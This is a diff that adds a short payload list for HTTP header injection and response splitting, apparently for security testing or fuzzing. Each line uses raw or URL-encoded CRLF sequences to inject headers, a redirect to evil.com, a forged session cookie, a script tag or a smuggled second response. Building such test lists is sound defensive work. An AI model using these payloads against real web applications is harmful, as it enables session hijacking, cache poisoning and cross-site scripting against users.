@@ -1,0 +1,15 @@
+test\r\nX-Injected-Header: true
+test\r\n\r\n<html>injected</html>
+test%0d%0aX-Injected-Header:%20true
+test%0aX-Injected-Header:%20true
+test\r\nContent-Type:%20text/html
+test\r\nLocation:%20http://evil.com
+test\r\n\r\n<script>alert(1)</script>
+test%0d%0aSet-Cookie:%20session=malicious
+test%0d%0aX-Custom:%20injected
+test%0aX-Custom:%20injected
+test\r\nAuthorization:%20Bearer%20stolen
+test\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>injected</html>
+test\r\nX-Frame-Options:%20ALLOWALL
+test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1 200 OK
+test\r\nTransfer-Encoding:%20chunked
